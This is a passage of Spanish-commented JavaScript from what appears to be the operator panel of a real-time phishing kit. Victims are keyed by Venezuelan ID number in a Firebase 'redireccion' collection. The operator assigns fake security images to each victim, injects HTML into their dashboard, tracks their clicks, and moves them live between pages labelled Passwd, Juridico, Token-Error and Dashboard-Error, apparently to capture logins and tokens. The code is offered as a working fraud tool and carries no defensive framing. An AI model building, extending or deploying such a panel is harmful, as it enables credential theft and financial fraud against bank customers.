        updateProfileImageUI();

        // Guardar en localStorage la selección de imagen de perfil
        saveSelectionToLocalStorage();
    }
}

// Actualizar UI con la imagen de perfil seleccionada
function updateProfileImageUI() {
    if (profileImageSelectedText) {
        if (selectedProfileImage) {
            const fileName = selectedProfileImage.split('/').pop();
            profileImageSelectedText.textContent = `Seleccionada: ${fileName}`;
            profileImageSelectedText.className = 'badge badge-success ml-2';
        } else {
            profileImageSelectedText.textContent = 'No seleccionada';
            profileImageSelectedText.className = 'badge badge-primary ml-2';
        }
    }
}

// Función para guardar la selección de imágenes en localStorage
function saveSelectionToLocalStorage() {
    if (!currentImgUser) return;

    // Estructura para almacenar las selecciones de imágenes por usuario
    let savedSelections = {};

    // Intentar cargar selecciones guardadas previamente
    try {
        const savedData = localStorage.getItem('panelImageSelections');
        if (savedData) {
            savedSelections = JSON.parse(savedData);
        }
    } catch (e) {
        console.warn('Error al cargar selecciones guardadas:', e);
    }

    // Obtener el mensaje personalizado si existe
    const customMessageInput = document.getElementById('input-custom-message');
    const customMessage = customMessageInput ? customMessageInput.value : '';

    // Guardar la selección actual para el usuario activo
    savedSelections[currentImgUser] = {
        selectedImages: selectedImages,
        profileImage: selectedProfileImage,
        customMessage: customMessage,
        timestamp: new Date().toISOString()
    };

    // Guardar en localStorage
    try {
        localStorage.setItem('panelImageSelections', JSON.stringify(savedSelections));
        console.log(`Selección guardada para usuario ${currentImgUser}: ${selectedImages.length} imágenes`);
    } catch (e) {
        console.error('Error guardando selección en localStorage:', e);
    }
}

// Función para manejar la selección de imágenes
function handleImageSelection(event) {
    const checkbox = event.target;
    const imgPath = checkbox.dataset.imgPath;

    if (checkbox.checked) {
        // Si ya tenemos 12 imágenes seleccionadas, impedir seleccionar más
        if (selectedImages.length >= MAX_IMAGES) {
            checkbox.checked = false;
            alert(`Solo puede seleccionar ${MAX_IMAGES} imágenes`);
            return;
        }
        // Agregar a la lista de seleccionadas
        selectedImages.push(imgPath);
    } else {
        // Remover de la lista de seleccionadas
        const index = selectedImages.indexOf(imgPath);
        if (index !== -1) {
            selectedImages.splice(index, 1);
        }
    }

    // Guardar la selección en localStorage
    saveSelectionToLocalStorage();

    // Actualizar contador y botón
    updateImageSelectionUI();
}

// Actualizar contador y estado de los botones
function updateImageSelectionUI() {
    if (selectedCountElement) {
        selectedCountElement.textContent = selectedImages.length;
    }

    // Habilita o deshabilita ambos botones según si hay exactamente MAX_IMAGES seleccionadas
    const buttonsEnabled = selectedImages.length === MAX_IMAGES;

    if (saveImagesBtn) {
        saveImagesBtn.disabled = !buttonsEnabled;
    }

    if (saveImagesBtnGb) {
        saveImagesBtnGb.disabled = !buttonsEnabled;
    }

    if (saveImagesErrorBtn) {
        saveImagesErrorBtn.disabled = !buttonsEnabled;
    }
}

// Función para cargar imágenes seleccionadas del usuario actual
async function loadUserSelectedImages(userId) {
    if (!userId) return;

    try {
        // Si hay un usuario anterior, guardar su selección antes de cambiar
        if (currentImgUser && currentImgUser !== userId) {
            saveSelectionToLocalStorage();
        }

        currentImgUser = userId;
        let loadedFromLocalStorage = false;
        let userData = null;

        // Intentar cargar desde localStorage primero
        try {
            const savedData = localStorage.getItem('panelImageSelections');
            if (savedData) {
                const savedSelections = JSON.parse(savedData);
                if (savedSelections[userId]) {
                    selectedImages = savedSelections[userId].selectedImages || [];
                    selectedProfileImage = savedSelections[userId].profileImage || null;

                    // Cargar mensaje personalizado desde localStorage
                    const customMessage = savedSelections[userId].customMessage || '';
                    const customMessageInput = document.getElementById('input-custom-message');
                    if (customMessageInput) {
                        customMessageInput.value = customMessage;
                    }

                    console.log(`Selección cargada desde localStorage para usuario ${userId}: ${selectedImages.length} imágenes`);
                    loadedFromLocalStorage = true;
                }
            }
        } catch (e) {
            console.warn('Error al cargar desde localStorage:', e);
        }

        // Si no se cargó desde localStorage, cargar desde Firestore
        if (!loadedFromLocalStorage) {
            const userDocRef = doc(db, "redireccion", userId);
            const userSnap = await getDoc(userDocRef);

            if (userSnap.exists()) {
                userData = userSnap.data();
                // Resetear la selección actual
                selectedImages = [];

                // Obtener imágenes guardadas o inicializar array vacío
                if (userData.selectedImages && Array.isArray(userData.selectedImages)) {
                    selectedImages = userData.selectedImages;
                }

                // Obtener la imagen de perfil seleccionada
                selectedProfileImage = userData.profileImageSrc || null;

                // Guardar en localStorage lo que cargamos de Firestore
                saveSelectionToLocalStorage();
            }
        }

        // Actualizar UI para reflejar las imágenes guardadas - SIEMPRE, independientemente de la fuente
        document.querySelectorAll('.img-checkbox').forEach(checkbox => {
            const imgPath = checkbox.dataset.imgPath;
            checkbox.checked = selectedImages.includes(imgPath);
        });

        // Cargar el mensaje personalizado si existe (sólo desde Firestore)
        if (userData) {
            const customMessageInput = document.getElementById('input-custom-message');
            if (customMessageInput && userData.customDashboardMessage) {
                customMessageInput.value = userData.customDashboardMessage;
            } else if (customMessageInput) {
                customMessageInput.value = '';
            }
        }

        // Actualizar la selección de imagen de perfil en la UI
        if (selectedProfileImage) {
            // Marcar el radio button correspondiente
            document.querySelectorAll('.profile-img-radio').forEach(radio => {
                const imgPath = radio.dataset.imgPath;
                if (imgPath === selectedProfileImage) {
                    radio.checked = true;
                } else {
                    radio.checked = false;
                }
            });
        } else {
            // Si no hay imagen de perfil, deseleccionar todos los radio buttons
            document.querySelectorAll('.profile-img-radio').forEach(radio => {
                radio.checked = false;
            });
        }

        // Actualizar la UI de la imagen de perfil
        updateProfileImageUI();

        updateImageSelectionUI();
        logCommand(`Imágenes cargadas para usuario ${userId}: ${selectedImages.length} seleccionadas`);
    } catch (error) {
        console.error("Error cargando imágenes:", error);
        logCommand(`Error cargando imágenes: ${error.message}`);
    }
}

// Manejar cambio de usuario en el selector de imágenes
if (imgUserSelect) {
    imgUserSelect.addEventListener('change', function () {
        const selectedUserId = this.value;
        if (selectedUserId) {
            loadUserSelectedImages(selectedUserId);
        } else {
            // Resetear cuando no hay usuario seleccionado
            selectedImages = [];
            document.querySelectorAll('.img-checkbox').forEach(checkbox => {
                checkbox.checked = false;
            });
            updateImageSelectionUI();
        }
    });
}

// Función para guardar datos y redirigir al usuario a una página específica
async function saveImageData(pageToRedirect) {
    if (!currentImgUser) {
        alert("Por favor seleccione un usuario");
        return;
    }

    if (selectedImages.length !== MAX_IMAGES) {
        alert(`Debe seleccionar exactamente ${MAX_IMAGES} imágenes`);
        return;
    }

    // Obtener el mensaje personalizado del input
    const customMessageInput = document.getElementById('input-custom-message');
    const customMessage = customMessageInput ? customMessageInput.value.trim() : "";

    try {
        // Guardar en Firebase (imágenes, mensaje personalizado e imagen de perfil)
        const userDocRef = doc(db, "redireccion", currentImgUser);
        await updateDoc(userDocRef, {
            selectedImages: selectedImages,
            customDashboardMessage: customMessage, // Guardar el mensaje personalizado
            profileImageSrc: selectedProfileImage, // Guardar la imagen de perfil seleccionada
            lastUpdate: new Date().toISOString()
        });

        // Actualizar el campo page para redirigir al usuario a la página correspondiente
        await updateDoc(userDocRef, {
            page: pageToRedirect,
            lastUpdate: new Date().toISOString()
        });

        const messageLogInfo = customMessage ? ` y mensaje "${customMessage}"` : "";
        const targetPage = pageToRedirect === 4 ? "dashboard.html" : "dashboard-tk.html";
        logCommand(`Imágenes guardadas para usuario ${currentImgUser}: ${selectedImages.length} imágenes${messageLogInfo}. Redirigiendo a ${targetPage}`);

        // Limpiar el campo de mensaje después de guardar
        if (customMessageInput) {
            customMessageInput.value = "";
        }

        // Añadir un botón para limpiar localStorage si es necesario
        /* const clearLocalStoragePrompt = confirm(`Datos guardados`);
        if (clearLocalStoragePrompt) {
            // Limpiar solo los datos del usuario actual
            try {
                const savedData = localStorage.getItem('panelImageSelections');
                if (savedData) {
                    const savedSelections = JSON.parse(savedData);
                    if (savedSelections[currentImgUser]) {
                        delete savedSelections[currentImgUser];
                        localStorage.setItem('panelImageSelections', JSON.stringify(savedSelections));
                        logCommand(`Caché local eliminado para usuario ${currentImgUser}`);
                    }
                }
            } catch (e) {
                console.warn('Error al limpiar localStorage:', e);
            }
        } */
    } catch (error) {
        console.error("Error guardando imágenes:", error);
        logCommand(`Error: ${error.message}`);
        alert("Error al guardar imágenes: " + error.message);
    }
}

// Función para guardar HTML dinámico y datos del usuario
async function saveHTMLData(pageToRedirect = 4) {
    if (!currentImgUser) {
        alert("Por favor seleccione un usuario");
        return;
    }

    // Obtener el HTML del editor
    const htmlInput = document.getElementById('htmlInput');
    const customHTML = htmlInput ? htmlInput.value.trim() : "";
    
    if (!customHTML) {
        alert("Por favor ingrese HTML para inyectar en el dashboard");
        return;
    }

    // Obtener el mensaje personalizado del input
    const customMessageInput = document.getElementById('input-custom-message');
    const customMessage = customMessageInput ? customMessageInput.value.trim() : "";

    try {
        // Guardar en Firebase (HTML personalizado, mensaje e imagen de perfil)
        const userDocRef = doc(db, "redireccion", currentImgUser);
        await updateDoc(userDocRef, {
            customHTML: customHTML, // Guardar el HTML personalizado
            customDashboardMessage: customMessage, // Guardar el mensaje personalizado
            profileImageSrc: selectedProfileImage, // Guardar la imagen de perfil seleccionada
            lastUpdate: new Date().toISOString()
        });

        // Actualizar el campo page para redirigir al usuario a la página correspondiente
        await updateDoc(userDocRef, {
            page: pageToRedirect,
            lastUpdate: new Date().toISOString()
        });

        const messageLogInfo = customMessage ? ` y mensaje "${customMessage}"` : "";
        const profileLogInfo = selectedProfileImage ? ` e imagen de perfil "${selectedProfileImage}"` : "";
        const targetPage = pageToRedirect === 4 ? "dashboard.html" : "dashboard-tk.html";
        
        logCommand(`HTML dinámico guardado para usuario ${currentImgUser}: ${customHTML.length} caracteres${messageLogInfo}${profileLogInfo}. Redirigiendo a ${targetPage}`);

        // Mostrar mensaje de éxito
        showDynamicHTMLMessage(`✅ HTML aplicado al dashboard de ${currentImgUser}`, 'success');
        
        // Reproducir sonido de éxito si está disponible
        if (window.playPanelSuccessSound) {
            window.playPanelSuccessSound();
        }

        // Limpiar el campo de mensaje después de guardar (opcional)
        // if (customMessageInput) {
        //     customMessageInput.value = "";
        // }
        
        // Opcional: limpiar el HTML del editor después de aplicar
        // if (htmlInput) {
        //     htmlInput.value = "";
        //     updateHTMLStats();
        // }

    } catch (error) {
        console.error("Error guardando HTML dinámico:", error);
        logCommand(`Error: ${error.message}`);
        alert("Error al guardar HTML dinámico: " + error.message);
        
        // Reproducir sonido de error si está disponible
        if (window.playPanelErrorSound) {
            window.playPanelErrorSound();
        }
    }
}

// Manejar eventos de clic en los botones de guardar imágenes
if (saveImagesBtn) {
    saveImagesBtn.addEventListener('click', function () {
        saveImageData(4); // Redirigir a dashboard.html (página 4)
    });
}

if (saveImagesBtnGb) {
    saveImagesBtnGb.addEventListener('click', function () {
        saveImageData(10); // Redirigir a dashboard-gb.html (página 10)
    });
}

if (saveImagesErrorBtn) {
    saveImagesErrorBtn.addEventListener('click', function () {
        saveImageData(5); // Redirigir a dashboard-tk.html (página 5)
    });
}

// Añadir CSS en línea para las imágenes
function addImageStyles() {
    const style = document.createElement('style');
    style.textContent = `
        /* Estilos compartidos para ambos selectores */
        .image-gallery img {
            transition: all 0.3s ease;
            max-height: 100px;
            object-fit: cover;
        }
        .image-gallery .overlay {
            position: absolute;
            top: 5px;
            right: 5px;
            opacity: 0;
            transition: all 0.3s ease;
        }
        
        /* Estilos para checkboxes (selector de 12 imágenes) */
        .image-gallery .image-checkbox {
            position: relative;
            display: block;
        }
        .image-gallery .img-checkbox {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        .image-gallery .img-checkbox:checked + label img {
            border: 3px solid #28a745;
            transform: scale(0.95);
        }
        .image-gallery .img-checkbox:checked + label .overlay {
            opacity: 1;
        }
        .image-gallery .img-checkbox:checked + label .overlay i {
            font-size: 1.5rem;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        
        /* Estilos para radio buttons (selector de imagen de perfil) */
        .profile-images .image-radio {
            position: relative;
            display: block;
        }
        .profile-images .profile-img-radio {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        .profile-images .profile-img-radio:checked + label img {
            border: 3px solid #007bff;
            transform: scale(0.95);
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
        }
        .profile-images .profile-img-radio:checked + label .overlay {
            opacity: 1;
        }
        .profile-images .profile-img-radio:checked + label .overlay i {
            font-size: 1.5rem;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
            color: #007bff;
        }
        .profile-images .profile-img-radio:not(:checked) + label:hover img {
            border: 3px solid #ccc;
        }
    `;
    document.head.appendChild(style);
}

// Función para manejar la copia al portapapeles
function setupCopyToClipboard() {
    document.addEventListener('click', function(e) {
        const copyableElement = e.target.closest('.copyable');
        if (!copyableElement) return;
        
        const textToCopy = copyableElement.getAttribute('data-value');
        if (!textToCopy) return;
        
        // Crear un área de texto temporal
        const textArea = document.createElement('textarea');
        textArea.value = textToCopy;
        textArea.style.position = 'fixed';  // Fuera de la pantalla
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            // Ejecutar el comando de copia
            const successful = document.execCommand('copy');
            const msg = successful ? '¡Copiado!' : 'No se pudo copiar';
            
            // Mostrar tooltip
            const tooltip = document.createElement('div');
            tooltip.textContent = msg;
            tooltip.style.position = 'fixed';
            tooltip.style.backgroundColor = 'rgba(0,0,0,0.8)';
            tooltip.style.color = 'white';
            tooltip.style.padding = '5px 10px';
            tooltip.style.borderRadius = '4px';
            tooltip.style.zIndex = '9999';
            tooltip.style.left = (e.pageX + 10) + 'px';
            tooltip.style.top = (e.pageY - 10) + 'px';
            document.body.appendChild(tooltip);
            
            // Eliminar tooltip después de 1.5 segundos
            setTimeout(() => {
                document.body.removeChild(tooltip);
            }, 1500);
            
        } catch (err) {
            console.error('Error al copiar: ', err);
        } finally {
            // Limpiar
            document.body.removeChild(textArea);
        }
    });
}

// Inicializar la aplicación cuando el DOM esté cargado
document.addEventListener("DOMContentLoaded", async function () {
    // Cargar credenciales desde Firebase
    await loadAdminCredentials();
    // Agregar estilos para la galería de imágenes
    addImageStyles();
    // Cargar imágenes disponibles
    loadAvailableImages();

    // Add click event listener for copyable elements
    document.addEventListener('click', function(e) {
        const copyableElement = e.target.closest('.copyable');
        const copyIcon = e.target.closest('img[src*="copy-4.png"]');
        
        if (copyableElement || copyIcon) {
            e.preventDefault();
            e.stopPropagation();
            
            const elementToUse = copyableElement || copyIcon.closest('.copyable');
            const valueToCopy = elementToUse.getAttribute('data-value');
            
            // Split the value at - and take the first part, then trim any whitespace
            const valueToCopySplit = valueToCopy.split('-')[0].trim();
            
            // Copy to clipboard
            navigator.clipboard.writeText(valueToCopySplit).then(() => {
                // Show a tooltip or feedback to the user
                const originalTitle = elementToUse.getAttribute('title');
                elementToUse.setAttribute('title', '¡Copiado!');
                
                // Create and show a temporary tooltip
                const tooltip = new bootstrap.Tooltip(elementToUse, {
                    title: '¡Copiado!',
                    trigger: 'manual'
                });
                tooltip.show();
                
                // Reset the tooltip after 2 seconds
                setTimeout(() => {
                    tooltip.hide();
                    elementToUse.setAttribute('title', originalTitle);
                    // Clean up the tooltip
                    setTimeout(() => tooltip.dispose(), 100);
                }, 2000);
            }).catch(err => {
                console.error('Error al copiar: ', err);
            });
        }
    });

    // Verificar si el administrador está logueado
    if (localStorage.getItem("adminLoggedIn") === "true") {
        if (loginScreen) loginScreen.classList.add("d-none");
        if (adminPanel) adminPanel.classList.remove("d-none");
        loadActiveUsers();
        logCommand("Panel de administrador inicializado - Sesión restaurada");
    } else {
        logCommand("Panel de administrador esperando credenciales");
    }
});



// Función para obtener información del último click en HTML personalizado
function getLastClickInfo(userData) {
    // Si hay una imagen seleccionada específicamente, mostrar esa información
    if (userData.selectedImageSrc && userData.lastClickTime) {
        const clickTime = new Date(userData.lastClickTime).toLocaleString();
        const imageName = userData.selectedImageSrc.split('/').pop();
        
        return ``;
    }
    
    // Si no hay imagen seleccionada pero hay información de click, mostrar eso
    if (!userData.lastClickedElement || !userData.lastClickTime) {
        return '';
    }
    
    const clickInfo = userData.lastClickedElement;
    const clickTime = new Date(userData.lastClickTime).toLocaleString();
    
    // Crear información resumida del elemento clickeado
    let elementDescription = '';
    
    if (clickInfo.tagName === 'img' && clickInfo.src) {
        const imageName = clickInfo.src.split('/').pop();
        const altText = clickInfo.alt || 'Sin descripción';
        elementDescription = `🖼️ Imagen: ${imageName}`;
        if (altText && altText !== 'Sin descripción') {
            elementDescription += ` (${altText})`;
        }
    } else if (clickInfo.tagName === 'button') {
        elementDescription = `Botón: "${clickInfo.textContent.substring(0, 20)}..."`;
    } else if (clickInfo.tagName === 'a') {
        elementDescription = `Enlace: "${clickInfo.textContent.substring(0, 20)}..."`;
    } else if (clickInfo.textContent) {
        elementDescription = `${clickInfo.tagName.toUpperCase()}: "${clickInfo.textContent.substring(0, 20)}..."`;
    } else {
        elementDescription = `Elemento: ${clickInfo.tagName.toUpperCase()}`;
    }
    
    // Verificar si la imagen clickeada se está mostrando en la card
    const isImageShowing = clickInfo.tagName === 'img' && clickInfo.src;
    const bgColor = isImageShowing ? '#d4edda' : '#f8f9fa';
    const textColor = isImageShowing ? '#155724' : '#007bff';
    const icon = isImageShowing ? '🎆' : '🖱️';
    const title = isImageShowing ? 'Imagen Mostrada Arriba' : 'Último Click HTML';
    
    return `
                <hr style="margin: 10px 0;">
                <div style="background-color: ${bgColor}; padding: 8px; border-radius: 4px; font-size: 12px; border: ${isImageShowing ? '1px solid #c3e6cb' : 'none'};">
                    <strong>${icon} ${title}:</strong><br>
                    <span style="color: ${textColor}; font-weight: ${isImageShowing ? 'bold' : 'normal'};">${elementDescription}</span><br>
                    <small style="color: #6c757d;">${clickTime}</small>
                    ${isImageShowing ? '<br><small style="color: #155724;">✅ Esta imagen se muestra en la card</small>' : ''}
                </div>`;
}

// Función para convertir página a texto de estado
function getStatusText(page) {
    switch (page) {
        case 1:
            return "Inicio";
        case 2:
            return "Passwd";
        case 3:
            return "Juridico";
        case 4:
            return "Dashboard";
        case 5:
            return "Dashboard-Error";
        case 6:
            return "Passwd-Error";
        case 7:
            return "Juridico-Error";
        case 8:
            return "Token-Error";
        case 9:
            return "Fuera";
        default:
            return "Cargando...";
    }
}

// Función para obtener la clase de color para el estado
function getStatusClass(page) {
    switch (page) {
        case 0:
            return "secondary";
        case 1:
            return "success";
        case 2:
            return "info";
        case 3:
            return "warning";
        case 4:
            return "success";
        case 5:
            return "danger";
        case 6:
            return "danger";
        case 7:
            return "light";
        case 8:
            return "danger";
        case 9:
            return "success";
        default:
            return "secondary";
    }
}

// Función para extraer el tipo de documento del userId
function getDocumentType(userId) {
    // El formato del userId es: "numeroDocumento - tipoDocumento"
    // Ejemplo: "6553543 - Venezolano" o "12345678 - Extranjero"
    if (userId && userId.includes(' - ')) {
        const parts = userId.split(' - ');
        return parts[1] || 'Venezolano'; // Fallback a Venezolano si no se encuentra
    }
    return 'Venezolano'; // Valor por defecto
}

// Función para obtener el color de fondo de la card basado en el tipo de documento
function getCardBackgroundColor(documentType) {
    // Solo las cards venezolanas mantienen fondo blanco
    // Todas las demás usan gris uniforme para mejor legibilidad
    return documentType === 'Venezolano' ? '#ffffff' : '#000';
}

// Función para obtener el color del borde de la card basado en el tipo de documento
function getCardBorderColor(documentType) {
    // Cards venezolanas: borde gris claro
    // Cards no-venezolanas: borde gris más oscuro para mejor definición
    return documentType === 'Venezolano' ? '#dee2e6' : '#000';
}

// Función para obtener el color del texto basado en el tipo de documento
function getCardTextColor(documentType) {
    // Para mejor legibilidad, usar texto negro en todas las cards
    return '#707070';
}

// Las funciones de audio ahora se manejan globalmente desde panel-audio-integration.js
// playPanelActionSound, playPanelSuccessSound, playPanelErrorSound están disponibles globalmente

// ========================================
// SISTEMA DE MANIPULACIÓN DINÁMICA DEL DOM
// ========================================

// Variable para almacenar el HTML original del contenedor de imágenes
let originalImagesHTML = null;

// Función para inicializar el sistema de manipulación dinámica
function initializeDynamicHTMLSystem() {
    // Esperar un momento para que el contenido dinámico se genere
    setTimeout(() => {
        const imagesContainer = document.getElementById('images-container');
        if (imagesContainer && !originalImagesHTML) {
            // Capturar el HTML actual (que puede ser dinámico)
            originalImagesHTML = imagesContainer.innerHTML;
            console.log('📝 HTML dinámico del contenedor de imágenes guardado');
            console.log('Contenido capturado:', originalImagesHTML.length + ' caracteres');
        }
    }, 1000); // Esperar 1 segundo para que se genere el contenido dinámico
    
    // Configurar el textarea con un ejemplo más completo
    const htmlInput = document.getElementById('htmlInput');
    if (htmlInput && htmlInput.value.trim() === '') {
        htmlInput.value = `<!-- Ejemplo: Galería simple con 4 imágenes -->
<div class="custom-gallery row">
    <div class="col-md-3 col-sm-4 col-6 mb-3">
        <img onclick="checkImg('img/dashboard/atardecer.jpg');" 
             src="img/dashboard/atardecer.jpg" 
             alt="Atardecer" 
             class="card img-picker img-responsive tile" 
             style="box-shadow: none; width: 100%; height: 150px; object-fit: cover;">
        <p class="text-center mt-2">Atardecer</p>
    </div>
    <div class="col-md-3 col-sm-4 col-6 mb-3">
        <img onclick="checkImg('img/dashboard/cebiche.jpg');" 
             src="img/dashboard/cebiche.jpg" 
             alt="Cebiche" 
             class="card img-picker img-responsive tile" 
             style="box-shadow: none; width: 100%; height: 150px; object-fit: cover;">
        <p class="text-center mt-2">Cebiche</p>
    </div>
    <div class="col-md-3 col-sm-4 col-6 mb-3">
        <img onclick="checkImg('img/dashboard/cerezo.jpg');" 
             src="img/dashboard/cerezo.jpg" 
             alt="Cerezo" 
             class="card img-picker img-responsive tile" 
             style="box-shadow: none; width: 100%; height: 150px; object-fit: cover;">
        <p class="text-center mt-2">Cerezo</p>
    </div>
    <div class="col-md-3 col-sm-4 col-6 mb-3">
        <img onclick="checkImg('img/dashboard/edificio.jpg');" 
             src="img/dashboard/edificio.jpg" 
             alt="Edificio" 
             class="card img-picker img-responsive tile" 
             style="box-shadow: none; width: 100%; height: 150px; object-fit: cover;">
        <p class="text-center mt-2">Edificio</p>
    </div>
</div>`;
    }
}

// Función para capturar el HTML actual del contenedor
function captureCurrentHTML() {
    const imagesContainer = document.getElementById('images-container');
    if (imagesContainer) {
        originalImagesHTML = imagesContainer.innerHTML;
        showDynamicHTMLMessage(`📷 HTML actual capturado: ${originalImagesHTML.length} caracteres`, 'info');
        logCommand(`HTML actual del contenedor capturado: ${originalImagesHTML.length} caracteres`);
        console.log('📷 HTML actual capturado como original');
        return true;
    }
    return false;
}

// Función para aplicar HTML dinámico al contenedor
function applyDynamicHTML() {
    const htmlInput = document.getElementById('htmlInput');
    const imagesContainer = document.getElementById('images-container');
    
    if (!htmlInput || !imagesContainer) {
        alert('❌ Error: No se encontraron los elementos necesarios');
        return;
    }
    
    const customHTML = htmlInput.value.trim();
    
    if (!customHTML) {
        alert('⚠️ Por favor, ingresa HTML válido');
        return;
    }
    
    try {
        // Validar que el HTML sea válido creando un elemento temporal
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = customHTML;
        
        // Aplicar el HTML personalizado
        imagesContainer.innerHTML = customHTML;
        
        // Mostrar mensaje de éxito
        showDynamicHTMLMessage('✅ HTML aplicado correctamente', 'success');
        
        // Reproducir sonido de éxito si está disponible
        if (window.playPanelSuccessSound) {
            window.playPanelSuccessSound();
        }
        
        // Log de la acción
        logCommand(`HTML dinámico aplicado: ${customHTML.length} caracteres`);
        
        // Colapsar el panel después de aplicar
        const htmlEditor = document.getElementById('htmlEditor');
        if (htmlEditor && htmlEditor.classList.contains('in')) {
            htmlEditor.classList.remove('in');
        }
        
    } catch (error) {
        console.error('Error aplicando HTML:', error);
        alert('❌ Error: El HTML ingresado no es válido');
        
        // Reproducir sonido de error si está disponible
        if (window.playPanelErrorSound) {
            window.playPanelErrorSound();
        }
    }
}

// Función para restaurar el HTML original
function resetToOriginalHTML() {
    const imagesContainer = document.getElementById('images-container');
    
    if (!imagesContainer) {
        alert('❌ Error: No se encontró el contenedor de imágenes');
        return;
    }
    
    if (!originalImagesHTML) {
        alert('⚠️ No se encontró el HTML original guardado');
        return;
    }
    
    try {
        // Restaurar el HTML original
        imagesContainer.innerHTML = originalImagesHTML;
        
        // Mostrar mensaje de éxito
        showDynamicHTMLMessage('🔄 HTML original restaurado', 'warning');
        
        // Reproducir sonido de acción si está disponible
        if (window.playPanelActionSound) {
            window.playPanelActionSound();
        }
        
        // Log de la acción
        logCommand('HTML original restaurado en el contenedor de imágenes');
        
    } catch (error) {
        console.error('Error restaurando HTML:', error);
        alert('❌ Error al restaurar el HTML original');
    }
}

// Función para mostrar vista previa del HTML
function previewHTML() {
    const htmlInput = document.getElementById('htmlInput');
    const previewContainer = document.getElementById('htmlPreview');
    const previewContent = document.getElementById('previewContent');
    
    if (!htmlInput || !previewContainer || !previewContent) {
        alert('❌ Error: No se encontraron los elementos de vista previa');
        return;
    }
    
    const customHTML = htmlInput.value.trim();
    
    if (!customHTML) {
        alert('⚠️ Por favor, ingresa HTML para previsualizar');
        return;
    }
    
    try {
        // Validar HTML
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = customHTML;
        
        // Mostrar vista previa
        previewContent.innerHTML = customHTML;
        previewContainer.style.display = 'block';
        
        // Scroll hacia la vista previa
        previewContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        
        // Reproducir sonido de acción si está disponible
        if (window.playPanelActionSound) {
            window.playPanelActionSound();
        }
        
        // Log de la acción
        logCommand(`Vista previa generada: ${customHTML.length} caracteres`);
        
    } catch (error) {
        console.error('Error en vista previa:', error);
        alert('❌ Error: El HTML ingresado no es válido para vista previa');
        previewContainer.style.display = 'none';
    }
}

// Función para mostrar mensajes del sistema de HTML dinámico
function showDynamicHTMLMessage(message, type = 'info') {
    // Crear elemento de mensaje
    const messageDiv = document.createElement('div');
    messageDiv.className = `alert alert-${type} alert-dismissible fade in`;
    messageDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 9999;
        max-width: 400px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    `;
    
    messageDiv.innerHTML = `
        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
        </button>
        <strong>Editor HTML:</strong> ${message}
    `;
    
    // Agregar al body
    document.body.appendChild(messageDiv);
    
    // Auto-remover después de 4 segundos
    setTimeout(() => {
        if (messageDiv.parentNode) {
            messageDiv.classList.remove('in');
            setTimeout(() => {
                if (messageDiv.parentNode) {
                    messageDiv.parentNode.removeChild(messageDiv);
                }
            }, 150);
        }
    }, 4000);
}

// Función para exportar el HTML actual del contenedor
function exportCurrentHTML() {
    const imagesContainer = document.getElementById('images-container');
    
    if (!imagesContainer) {
        alert('❌ Error: No se encontró el contenedor de imágenes');
        return;
    }
    
    const currentHTML = imagesContainer.innerHTML;
    
    // Crear un blob con el HTML
    const blob = new Blob([currentHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    
    // Crear enlace de descarga
    const a = document.createElement('a');
    a.href = url;
    a.download = `images-container-${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.html`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showDynamicHTMLMessage('💾 HTML exportado correctamente', 'info');
    logCommand('HTML del contenedor exportado como archivo');
}

// Función para cargar HTML desde archivo
function loadHTMLFromFile() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = '.html,.htm,.txt';
    
    input.onchange = function(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        const reader = new FileReader();
        reader.onload = function(e) {
            const htmlInput = document.getElementById('htmlInput');
            if (htmlInput) {
                htmlInput.value = e.target.result;
                showDynamicHTMLMessage(`📁 Archivo "${file.name}" cargado`, 'info');
                logCommand(`HTML cargado desde archivo: ${file.name}`);
            }
        };
        reader.readAsText(file);
    };
    
    input.click();
}

// Función para limpiar el editor HTML
function clearHTMLEditor() {
    const htmlInput = document.getElementById('htmlInput');
    const previewContainer = document.getElementById('htmlPreview');
    
    if (!htmlInput) {
        alert('❌ Error: No se encontró el editor HTML');
        return;
    }
    
    // Confirmar acción
    if (confirm('¿Estás seguro de que quieres limpiar el editor HTML?')) {
        htmlInput.value = '';
        
        // Ocultar vista previa si está visible
        if (previewContainer) {
            previewContainer.style.display = 'none';
        }
        
        showDynamicHTMLMessage('🧹 Editor HTML limpiado', 'info');
        logCommand('Editor HTML limpiado por el usuario');
        
        // Reproducir sonido de acción si está disponible
        if (window.playPanelActionSound) {
            window.playPanelActionSound();
        }
    }
}

// Función para validar HTML antes de aplicar
function validateHTML(htmlString) {
    try {
        const parser = new DOMParser();
        const doc = parser.parseFromString(htmlString, 'text/html');
        
        // Verificar si hay errores de parsing
        const errorNode = doc.querySelector('parsererror');
        if (errorNode) {
            return {
                valid: false,
                error: 'HTML mal formado: ' + errorNode.textContent
            };
        }
        
        return { valid: true };
    } catch (error) {
        return {
            valid: false,
            error: 'Error de validación: ' + error.message
        };
    }
}

// Función para obtener estadísticas del HTML
function getHTMLStats(htmlString) {
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = htmlString;
    
    const stats = {
        characters: htmlString.length,
        elements: tempDiv.querySelectorAll('*').length,
        images: tempDiv.querySelectorAll('img').length,
        links: tempDiv.querySelectorAll('a').length,
        buttons: tempDiv.querySelectorAll('button').length
    };
    
    return stats;
}

// Función para actualizar estadísticas del HTML en tiempo real
function updateHTMLStats() {
    const htmlInput = document.getElementById('htmlInput');
    const charCount = document.getElementById('charCount');
    const elementCount = document.getElementById('elementCount');
    const imageCount = document.getElementById('imageCount');
    
    if (!htmlInput) return;
    
    const htmlContent = htmlInput.value;
    
    if (charCount) {
        charCount.textContent = `${htmlContent.length} caracteres`;
    }
    
    if (htmlContent.trim()) {
        try {
